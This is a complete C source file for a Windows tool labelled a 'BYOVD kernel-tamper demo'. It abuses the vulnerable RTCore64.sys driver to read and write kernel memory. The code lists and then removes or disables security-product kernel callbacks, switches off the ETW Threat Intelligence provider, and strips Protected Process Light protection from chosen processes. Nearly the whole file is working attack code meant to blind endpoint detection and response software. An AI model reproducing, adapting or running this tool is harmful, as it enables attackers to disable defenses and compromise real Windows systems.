#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "dbghelp.lib")

#define LOG_INFO(...) (printf("[*] "), printf(__VA_ARGS__), putchar('\n'))
#define LOG_OK(...)   (printf("[+] "), printf(__VA_ARGS__), putchar('\n'))
#define LOG_ERR(...)  (printf("[-] "), printf(__VA_ARGS__), putchar('\n'))
#define LOG_WARN(...) (printf("[!] "), printf(__VA_ARGS__), putchar('\n'))

#define RTCORE_DEVICE      "\\\\.\\RTCore64"
#define RTCORE_IOCTL_READ  0x80002048
#define RTCORE_IOCTL_WRITE 0x8000204C

#define SYMBOL_PATH       "srv*C:\\Symbols*https://msdl.microsoft.com/download/symbols"
#define SYM_FAKE_BASE     0x10000000ULL
#define MAX_CALLBACKS     64
#define MAX_LIST_NODES    64
#define MAX_REG_NODES     128
#define MAX_EPROCESS_WALK 512
#define MAX_TARGETS       32

#define IS_KERN_VA(x)     ((DWORD64)(x) >= 0xFFFF800000000000ULL)

/* RTCore64 IOCTL request layout: Address +0x08, Size +0x18, Value +0x1C.
 * Max width is 4 bytes; 64-bit accesses use two 32-bit IOCTLs. */
#pragma pack(push, 1)
typedef struct {
    BYTE    pad0[8];
    DWORD64 Address;
    BYTE    pad1[8];
    DWORD   Size;
    DWORD   Value;
    BYTE    pad2[16];
} RTCORE_MEM;
#pragma pack(pop)

static HANDLE g_device = INVALID_HANDLE_VALUE;

static DWORD kread32(DWORD64 addr)
{
    RTCORE_MEM req = {0}; DWORD bytes_out = 0;
    req.Address = addr; req.Size = 4;
    DeviceIoControl(g_device, RTCORE_IOCTL_READ,
                    &req, sizeof req, &req, sizeof req, &bytes_out, NULL);
    return req.Value;
}

static DWORD64 kread64(DWORD64 addr)
{
    return ((DWORD64)kread32(addr + 4) << 32) | kread32(addr);
}

static void kwrite32(DWORD64 addr, DWORD val)
{
    RTCORE_MEM req = {0}; DWORD bytes_out = 0;
    req.Address = addr; req.Size = 4; req.Value = val;
    DeviceIoControl(g_device, RTCORE_IOCTL_WRITE,
                    &req, sizeof req, &req, sizeof req, &bytes_out, NULL);
}

static void kwrite64(DWORD64 addr, DWORD64 val)
{
    kwrite32(addr,     (DWORD)(val & 0xFFFFFFFF));
    kwrite32(addr + 4, (DWORD)(val >> 32));
}

/* Byte write via read-modify-write: the driver only does 4-byte aligned
 * writes, and _EPROCESS.Protection is generally not aligned. */
static void kwrite8(DWORD64 addr, BYTE val)
{
    DWORD64 aligned = addr & ~(DWORD64)3;
    int     shift   = (int)(addr & 3) * 8;
    DWORD   dw      = kread32(aligned);
    kwrite32(aligned, (dw & ~(0xFFUL << shift)) | ((DWORD)val << shift));
}

typedef struct {
    DWORD64 PspCreateProcessNotifyRoutine;
    DWORD64 PspCreateThreadNotifyRoutine;
    DWORD64 PspLoadImageNotifyRoutine;
    DWORD64 ObTypeIndexTable;
    DWORD64 CallbackListHead;
    DWORD64 EtwpDebuggerData;
    DWORD64 PsInitialSystemProcess;
    DWORD   EtwpGuidHashTableOff;
    DWORD   EprocLinksOff;
    DWORD   EprocNameOff;
    DWORD   EprocProtOff;
} KERN_OFFSETS;

static KERN_OFFSETS g_offsets;

static DWORD os_build(void)
{
    typedef NTSTATUS (WINAPI *PFN)(PRTL_OSVERSIONINFOW);
    RTL_OSVERSIONINFOW vi = {0};
    PFN fn;

    vi.dwOSVersionInfoSize = sizeof vi;
    fn = (PFN)(void *)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    if (fn) fn(&vi); else GetVersionExW((OSVERSIONINFOW *)&vi);
    return vi.dwBuildNumber;
}

static DWORD udt_field_off(HANDLE hproc, DWORD64 pdb_base,
                           const char *type_name, const WCHAR *field_name)
{
    char                    sbuf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME];
    SYMBOL_INFO            *sym = (SYMBOL_INFO *)sbuf;
    DWORD                   child_count = 0, i, offset = 0;
    TI_FINDCHILDREN_PARAMS *children;

    memset(sbuf, 0, sizeof sbuf);
    sym->SizeOfStruct = sizeof(SYMBOL_INFO);
    sym->MaxNameLen   = MAX_SYM_NAME;
    if (!SymGetTypeFromName(hproc, pdb_base, type_name, sym))
        return 0;

    if (!SymGetTypeInfo(hproc, pdb_base, sym->TypeIndex,
                        TI_GET_CHILDRENCOUNT, &child_count) || child_count == 0)
        return 0;

    children = (TI_FINDCHILDREN_PARAMS *)
               calloc(1, sizeof(*children) + child_count * sizeof(ULONG));
    if (!children)
        return 0;

    children->Count = child_count;
    if (SymGetTypeInfo(hproc, pdb_base, sym->TypeIndex, TI_FINDCHILDREN, children)) {
        for (i = 0; i < child_count && !offset; i++) {
            WCHAR *sym_name = NULL;
            if (SymGetTypeInfo(hproc, pdb_base, children->ChildId[i],
                               TI_GET_SYMNAME, &sym_name) && sym_name) {
                if (wcscmp(sym_name, field_name) == 0)
                    SymGetTypeInfo(hproc, pdb_base, children->ChildId[i],
                                   TI_GET_OFFSET, &offset);
                LocalFree(sym_name);
            }
        }
    }

    free(children);
    return offset;
}

static BOOL resolve_offsets(void)
{
    typedef struct { const char *name; DWORD64 *dest; } SYM_MAP;

    SYM_MAP map[] = {
        { "PspCreateProcessNotifyRoutine", &g_offsets.PspCreateProcessNotifyRoutine },
        { "PspCreateThreadNotifyRoutine",  &g_offsets.PspCreateThreadNotifyRoutine  },
        { "PspLoadImageNotifyRoutine",     &g_offsets.PspLoadImageNotifyRoutine     },
        { "ObTypeIndexTable",              &g_offsets.ObTypeIndexTable              },
        { "CallbackListHead",              &g_offsets.CallbackListHead              },
        { "EtwpDebuggerData",              &g_offsets.EtwpDebuggerData              },
        { "PsInitialSystemProcess",        &g_offsets.PsInitialSystemProcess        },
    };
    const int N = sizeof map / sizeof map[0];

    char         sbuf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME];
    SYMBOL_INFO *sym      = (SYMBOL_INFO *)sbuf;
    HANDLE       hproc    = GetCurrentProcess();
    char         ntoskrnl[MAX_PATH], sysdir[MAX_PATH];
    DWORD64      pdb_base;
    DWORD        build_num;
    int          i;

    GetSystemDirectoryA(sysdir, sizeof sysdir);
    _snprintf_s(ntoskrnl, sizeof ntoskrnl, _TRUNCATE, "%s\\ntoskrnl.exe", sysdir);

    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
    if (!SymInitialize(hproc, SYMBOL_PATH, FALSE)) {
        LOG_ERR("SymInitialize failed (%lu)", GetLastError());
        return FALSE;
    }

    pdb_base = SymLoadModuleEx(hproc, NULL, ntoskrnl, NULL, SYM_FAKE_BASE, 0, NULL, 0);
    if (!pdb_base) {
        LOG_ERR("SymLoadModuleEx(%s) failed (%lu)", ntoskrnl, GetLastError());
        SymCleanup(hproc);
        return FALSE;
    }

    LOG_INFO("Resolving symbols from %s", ntoskrnl);

    for (i = 0; i < N; i++) {
        memset(sbuf, 0, sizeof sbuf);
        sym->SizeOfStruct = sizeof(SYMBOL_INFO);
        sym->MaxNameLen   = MAX_SYM_NAME;
        if (!SymFromName(hproc, map[i].name, sym)) {
            LOG_ERR("SymFromName(%s) failed (%lu)", map[i].name, GetLastError());
            SymCleanup(hproc);
            return FALSE;
        }
        *map[i].dest = sym->Address - pdb_base;
        LOG_OK("%-42s  RVA 0x%llX", map[i].name, (unsigned long long)*map[i].dest);
    }

    g_offsets.EprocLinksOff = udt_field_off(hproc, pdb_base, "_EPROCESS", L"ActiveProcessLinks");
    g_offsets.EprocNameOff  = udt_field_off(hproc, pdb_base, "_EPROCESS", L"ImageFileName");
    g_offsets.EprocProtOff  = udt_field_off(hproc, pdb_base, "_EPROCESS", L"Protection");

    if (!g_offsets.EprocLinksOff || !g_offsets.EprocNameOff || !g_offsets.EprocProtOff) {
        LOG_ERR("One or more _EPROCESS offsets unresolved - aborting");
        SymCleanup(hproc);
        return FALSE;
    }

    LOG_OK("_EPROCESS.ActiveProcessLinks  +0x%X", g_offsets.EprocLinksOff);
    LOG_OK("_EPROCESS.ImageFileName        +0x%X", g_offsets.EprocNameOff);
    LOG_OK("_EPROCESS.Protection           +0x%X", g_offsets.EprocProtOff);

    build_num = os_build();
    g_offsets.EtwpGuidHashTableOff = (build_num >= 22000) ? 0x2D0 : 0x1D0;
    LOG_OK("EtwpGuidHashTableOff  %s (build %lu)  0x%X",
           build_num >= 22000 ? "Windows 11" : "Windows 10",
           build_num, g_offsets.EtwpGuidHashTableOff);

    SymCleanup(hproc);
    LOG_INFO("Offset resolution complete");
    return TRUE;
}

typedef struct { DWORD64 Base; char Name[MAX_PATH]; } DRIVER_INFO;

static DRIVER_INFO g_drivers[1024];
static DWORD       g_driver_count = 0;

static int drvcmp(const void *a, const void *b)
{
    const DRIVER_INFO *x = (const DRIVER_INFO *)a;
    const DRIVER_INFO *y = (const DRIVER_INFO *)b;
    return x->Base < y->Base ? -1 : x->Base > y->Base ? 1 : 0;
}

static DWORD64 load_drivers(void)
{
    LPVOID buf[1024];
    DWORD  bytes_needed = 0, i;

    if (!EnumDeviceDrivers(buf, sizeof buf, &bytes_needed) || bytes_needed == 0) {
        LOG_ERR("EnumDeviceDrivers failed (%lu)", GetLastError());
        return 0;
    }

    g_driver_count = bytes_needed / sizeof(LPVOID);
    if (g_driver_count > 1024)
        g_driver_count = 1024;

    for (i = 0; i < g_driver_count; i++) {
        g_drivers[i].Base = (DWORD64)buf[i];
        if (!GetDeviceDriverBaseNameA(buf[i], g_drivers[i].Name, sizeof g_drivers[i].Name))
            strcpy_s(g_drivers[i].Name, sizeof g_drivers[i].Name, "unknown");
    }
    qsort(g_drivers, g_driver_count, sizeof(DRIVER_INFO), drvcmp);

    for (i = 0; i < g_driver_count; i++)
        if (_stricmp(g_drivers[i].Name, "ntoskrnl.exe") == 0)
            return g_drivers[i].Base;
    return g_driver_count ? g_drivers[0].Base : 0;
}

/* Best-effort owner of a kernel address. */
static const char *drv_name(DWORD64 address)
{
    DWORD i;

    for (i = 0; i + 1 < g_driver_count; i++)
        if (address >= g_drivers[i].Base && address < g_drivers[i + 1].Base)
            return g_drivers[i].Name;

    if (g_driver_count > 0 &&
        address >= g_drivers[g_driver_count - 1].Base &&
        address <  g_drivers[g_driver_count - 1].Base + 0x4000000)
        return g_drivers[g_driver_count - 1].Name;

    return "unknown";
}

static BOOL target_matches(const char *name, const char **targets, int target_count)
{
    int i;
    for (i = 0; i < target_count; i++)
        if (_stricmp(name, targets[i]) == 0)
            return TRUE;
    return FALSE;
}

/* CALLBACK_ENTRY_ITEM offsets */
#define CEI_FLINK         0x000
#define CEI_ACTIVE        0x014
#define CEI_PREOPERATION  0x028
#define CEI_POSTOPERATION 0x030
#define OB_CALLBACK_LIST_OFF 0x0C8

/* Registry callback node offsets */
#define CMREG_FLINK    0x000
#define CMREG_BLINK    0x008
#define CMREG_FUNCTION 0x028

static void psp_notify_walk(DWORD64 kern_base, const char *label, DWORD64 array_rva,
                            BOOL list_mode, const char **targets, int target_count)
{
    DWORD64 array_va = kern_base + array_rva;
    int     i;

    if (list_mode)
        LOG_OK("Psp%sNotifyRoutine @ 0x%016llX", label, array_va);

    for (i = 0; i < MAX_CALLBACKS; i++) {
        DWORD64     slot_addr = array_va + (DWORD64)i * 8;
        DWORD64     slot      = kread64(slot_addr);
        DWORD64     cb_block, fn_addr;
        const char *driver;

        if (!slot)
            continue;
        cb_block = slot & ~(DWORD64)0xF;
        if (!IS_KERN_VA(cb_block))
            continue;
        fn_addr = kread64(cb_block + 0x08);
        if (!fn_addr)
            continue;

        driver = drv_name(fn_addr);

        if (list_mode)
            printf("  [%2d]  0x%016llX  %s\n", i, fn_addr, driver);

        if (target_count > 0 && target_matches(driver, targets, target_count)) {
            kwrite64(slot_addr, 0);
            LOG_OK("Removed %s callback  slot=%d  fn=0x%016llX  [%s]",
                   label, i, fn_addr, driver);
        }
    }

    if (list_mode)
        printf("\n");
}

static void ob_callback_walk(DWORD64 kern_base, const char *label, int type_index,
                             BOOL list_mode, const char **targets, int target_count)
{
    DWORD64 obj_type  = kread64(kern_base + g_offsets.ObTypeIndexTable
                                          + (DWORD64)type_index * 8);
    DWORD64 list_head, node;
    int     count = 0;

    if (!obj_type || !IS_KERN_VA(obj_type)) {
        if (list_mode)
            LOG_WARN("%s: object type not readable - skipped", label);
        return;
    }

    list_head = obj_type + OB_CALLBACK_LIST_OFF;
    node      = kread64(list_head);

    if (list_mode)
        LOG_OK("ObCallbacks: %s", label);

    while (node && node != list_head && IS_KERN_VA(node) && count < MAX_LIST_NODES) {
        DWORD64     pre    = kread64(node + CEI_PREOPERATION);
        DWORD64     post   = kread64(node + CEI_POSTOPERATION);
        const char *driver = pre  ? drv_name(pre)
                           : post ? drv_name(post)
                           :        "unknown";

        if (list_mode)
            printf("  node=0x%016llX  Active=%u  Pre=0x%016llX  [%s]\n",
                   node, kread32(node + CEI_ACTIVE), pre, driver);

        if (target_count > 0 && target_matches(driver, targets, target_count)
            && kread32(node + CEI_ACTIVE)) {
            kwrite32(node + CEI_ACTIVE, 0);
            LOG_OK("Disabled ObCallback [%s]  [%s]", label, driver);
        }

        node = kread64(node + CEI_FLINK);
        count++;
    }

    if (list_mode && count == 0)
        printf("  (empty)\n");

    if (list_mode)
        printf("\n");
}

static void registry_callback_walk(DWORD64 kern_base, BOOL list_mode,
                                   const char **targets, int target_count)
{
    DWORD64 list_head = kern_base + g_offsets.CallbackListHead;
    DWORD64 prev_node = list_head;
    DWORD64 node      = kread64(list_head);
    int     count = 0;

    if (list_mode)
        LOG_OK("Registry Callbacks  (CallbackListHead @ 0x%016llX)", list_head);

    while (node && node != list_head && IS_KERN_VA(node) && count < MAX_REG_NODES) {
        DWORD64     next_node = kread64(node + CMREG_FLINK);
        DWORD64     fn_addr   = kread64(node + CMREG_FUNCTION);
        const char *driver    = fn_addr ? drv_name(fn_addr) : "unknown";

        if (!next_node || !IS_KERN_VA(next_node))
            break;

        if (list_mode)
            printf("  node=0x%016llX  fn=0x%016llX  [%s]\n", node, fn_addr, driver);

        if (target_count > 0 && target_matches(driver, targets, target_count)) {
            kwrite64(prev_node,               next_node);
            kwrite64(next_node + CMREG_BLINK, prev_node);
            LOG_OK("Unlinked registry callback  node=0x%016llX  [%s]", node, driver);
        } else {
            prev_node = node;
        }

        node = next_node;
        count++;
    }

    if (list_mode && count == 0)
        printf("  (empty)\n");

    if (list_mode)
        printf("\n");
}

static void cmd_callbacks(DWORD64 kern_base, BOOL list_mode,
                          const char **targets, int target_count)
{
    psp_notify_walk(kern_base, "Process",
                    g_offsets.PspCreateProcessNotifyRoutine,
                    list_mode, targets, target_count);
    psp_notify_walk(kern_base, "Thread",
                    g_offsets.PspCreateThreadNotifyRoutine,
                    list_mode, targets, target_count);
    psp_notify_walk(kern_base, "ImageLoad",
                    g_offsets.PspLoadImageNotifyRoutine,
                    list_mode, targets, target_count);

    ob_callback_walk(kern_base, "Process Handle", 7, list_mode, targets, target_count);
    ob_callback_walk(kern_base, "Thread Handle",  8, list_mode, targets, target_count);

    registry_callback_walk(kern_base, list_mode, targets, target_count);
}

/* ETW Threat Intelligence provider offsets */
#define ETW_GUID_OFF     0x028
#define ETW_PROV_OFF     0x060
#define ETW_SLOTS_OFF    0x080
#define ETW_LOGGERID_OFF 0x004
#define ETW_SLOT_SZ      0x020
#define ETW_BUCKET_SZ    0x038
#define ETW_BUCKET_IDX   29
#define TI_GUID_DATA1    0xF4E1897CUL
#define ETW_SILO_PTR_OFF 0x18

static void cmd_etwti(DWORD64 kern_base, BOOL list_mode, BOOL disable)
{
    DWORD64 etw_silo, bucket_head, node, ti_entry = 0;
    int     guard = 0, slot;

    etw_silo = kread64(kern_base + g_offsets.EtwpDebuggerData + ETW_SILO_PTR_OFF);
    if (IS_KERN_VA(etw_silo)) {
        bucket_head = etw_silo + g_offsets.EtwpGuidHashTableOff
                               + (DWORD64)ETW_BUCKET_IDX * ETW_BUCKET_SZ;
        node = kread64(bucket_head);
        while (node && node != bucket_head && IS_KERN_VA(node) && guard++ < MAX_LIST_NODES) {
            if (kread32(node + ETW_GUID_OFF) == TI_GUID_DATA1) {
                ti_entry = node;
                break;
            }
            node = kread64(node);
        }
    }

    if (list_mode) {
        printf("[+] ETW-TI (Microsoft-Windows-Threat-Intelligence)\n");
        if (!ti_entry) {
            printf("  (provider not found - ETW-TI inactive)\n\n");
            return;
        }

        printf("  entry=0x%016llX  ProviderEnabled=%u\n",
               ti_entry, kread32(ti_entry + ETW_PROV_OFF));

        for (slot = 0; slot < 8; slot++) {
            DWORD64 slot_addr = ti_entry + ETW_SLOTS_OFF + (DWORD64)slot * ETW_SLOT_SZ;
            if (kread32(slot_addr))
                printf("  Slot %d: Enabled  LoggerId=%u\n",
                       slot, (kread32(slot_addr + ETW_LOGGERID_OFF) >> 16) & 0xFFFF);
        }
        printf("\n");
    }

    if (disable) {
        if (!ti_entry) {
            LOG_ERR("TI provider entry not found - nothing to disable");
            return;
        }

        kwrite32(ti_entry + ETW_PROV_OFF, 0);
        for (slot = 0; slot < 8; slot++)
            kwrite32(ti_entry + ETW_SLOTS_OFF + (DWORD64)slot * ETW_SLOT_SZ, 0);

        LOG_OK("ETW-TI disabled  (entry=0x%016llX)", ti_entry);
    }
}

static void kread_name(DWORD64 address, char out[16])
{
    int i;
    for (i = 0; i < 16; i += 4) {
        DWORD d = kread32(address + i);
        memcpy(out + i, &d, 4);
    }
    out[15] = '\0';
}

/* Unaligned Protection byte via a masked read of its containing DWORD. */
static BYTE read_prot(DWORD64 eproc)
{
    DWORD64 aligned = (eproc + g_offsets.EprocProtOff) & ~(DWORD64)3;
    int     shift   = (int)((eproc + g_offsets.EprocProtOff) & 3) * 8;
    return (BYTE)(kread32(aligned) >> shift);
}

/* Plausible _PS_PROTECTION: Type (bits 2:0) 1..2, Signer (bits 7:4) 1..8. */
static BOOL prot_valid(BYTE p)
{
    BYTE type = p & 0x7, signer = (p >> 4) & 0xF;
    return type >= 1 && type <= 2 && signer >= 1 && signer <= 8;
}

static void print_prot(const char *name, BYTE p)
{
    static const char *Type[]   = { "None", "PPL", "Protected" };
    static const char *Signer[] = { "None", "Authenticode", "CodeGen",
                                    "Antimalware", "Lsa", "Windows",
                                    "WinTcb", "WinSystem", "App" };
    BYTE type = p & 0x7, signer = (p >> 4) & 0xF;

    printf("  %-20s  0x%02X  %-11s  %s\n",
           name, p,
           type   < 3 ? Type[type]     : "?",
           signer < 9 ? Signer[signer] : "?");
}

static void cmd_ppl(DWORD64 kern_base, BOOL list_mode,
                    const char **targets, int target_count)
{
    DWORD64 sys_eproc = kread64(kern_base + g_offsets.PsInitialSystemProcess);
    DWORD64 eproc, next_link;
    char    name[16];
    BYTE    prot;
    int     guard = 0;
    BOOL   *found = NULL;

    if (!IS_KERN_VA(sys_eproc)) {
        LOG_ERR("PsInitialSystemProcess unreadable (0x%016llX)", sys_eproc);
        return;
    }

    if (target_count > 0)
        found = (BOOL *)calloc(target_count, sizeof(BOOL));

    if (list_mode)
        printf("[+] PPL-protected processes:\n"
               "  %-20s  %-4s  %-11s  %s\n",
               "Name", "Byte", "Type", "Signer");

    eproc = sys_eproc;
    do {
        if (!IS_KERN_VA(eproc))
            break;

        prot = read_prot(eproc);
        kread_name(eproc + g_offsets.EprocNameOff, name);

        if (list_mode && prot_valid(prot))
            print_prot(name, prot);

        if (target_count > 0) {
            int t;
            for (t = 0; t < target_count; t++) {
                if (_stricmp(name, targets[t]) == 0) {
                    if (prot) {
                        kwrite8(eproc + g_offsets.EprocProtOff, 0);
                        LOG_OK("Stripped PPL on %s (was 0x%02X)", name, prot);
                    } else {
                        LOG_INFO("%s found but not protected - left as is", name);
                    }
                    if (found) found[t] = TRUE;
                    break;
                }
            }
        }

        next_link = kread64(eproc + g_offsets.EprocLinksOff);
        if (!next_link || !IS_KERN_VA(next_link))
            break;
        eproc = next_link - g_offsets.EprocLinksOff;

    } while (IS_KERN_VA(eproc) && eproc != sys_eproc && ++guard < MAX_EPROCESS_WALK);

    if (found) {
        int t;
        for (t = 0; t < target_count; t++)
            if (!found[t])
                LOG_ERR("'%s' not found", targets[t]);
        free(found);
    }

    if (list_mode)
        printf("\n");
}

static void usage(void)
{
    printf(
        "demo.exe - BYOVD kernel-tamper demo\n"
        "\n"
        "Usage:\n"
        "  demo.exe callbacks list\n"
        "  demo.exe callbacks delete <driver.sys> [driver2.sys ...]\n"
        "  demo.exe etwti    list\n"
        "  demo.exe etwti    disable\n"
        "  demo.exe ppl      list\n"
        "  demo.exe ppl      delete <process.exe> [process2.exe ...]\n"
        );
}

int main(int argc, char *argv[])
{
    const char *targets[MAX_TARGETS];
    int         target_count = 0;
    DWORD64     kern_base;
    BOOL        is_delete;
    BOOL        success = FALSE;

    if (argc < 3) {
        usage();
        return 1;
    }

    is_delete = (_stricmp(argv[1], "callbacks") == 0 ||
                 _stricmp(argv[1], "ppl")       == 0)
                && _stricmp(argv[2], "delete") == 0;
    if (is_delete) {
        int i;

        if (argc < 4) {
            LOG_ERR("'delete' requires at least one target name");
            usage();
            return 1;
        }
        if (argc - 3 > MAX_TARGETS) {
            LOG_ERR("at most %d targets per invocation", MAX_TARGETS);
            return 1;
        }
        for (i = 3; i < argc; i++)
            targets[target_count++] = argv[i];
    }

    if (!resolve_offsets())
        return 1;

    g_device = CreateFileA(RTCORE_DEVICE, GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);
    if (g_device == INVALID_HANDLE_VALUE) {
        LOG_ERR("RTCore64 open failed (%lu) - is RTCore64.sys loaded?", GetLastError());
        return 1;
    }

    kern_base = load_drivers();
    if (!kern_base) {
        LOG_ERR("failed to build the driver table");
        goto done;
    }
    LOG_OK("Kernel base (ntoskrnl.exe): 0x%016llX", kern_base);

    if ((kread32(kern_base) & 0xFFFF) != 0x5A4D) {
        LOG_ERR("kernel read sanity check failed (expected 'MZ' at base)");
        goto done;
    }
    printf("\n");

    if (_stricmp(argv[1], "callbacks") == 0) {
        if      (_stricmp(argv[2], "list")   == 0) cmd_callbacks(kern_base, TRUE,  NULL, 0);
        else if (is_delete)                        cmd_callbacks(kern_base, FALSE, targets, target_count);
        else { usage(); goto done; }
    }
    else if (_stricmp(argv[1], "etwti") == 0) {
        if      (_stricmp(argv[2], "list")    == 0) cmd_etwti(kern_base, TRUE,  FALSE);
        else if (_stricmp(argv[2], "disable") == 0) cmd_etwti(kern_base, FALSE, TRUE);
        else { usage(); goto done; }
    }
    else if (_stricmp(argv[1], "ppl") == 0) {
        if      (_stricmp(argv[2], "list")   == 0) cmd_ppl(kern_base, TRUE,  NULL, 0);
        else if (is_delete)                        cmd_ppl(kern_base, FALSE, targets, target_count);
        else { usage(); goto done; }
    }
    else {
        usage();
        goto done;
    }

    LOG_INFO("Done.");
    success = TRUE;

done:
    if (g_device != INVALID_HANDLE_VALUE)
        CloseHandle(g_device);
    return success ? 0 : 1;
}
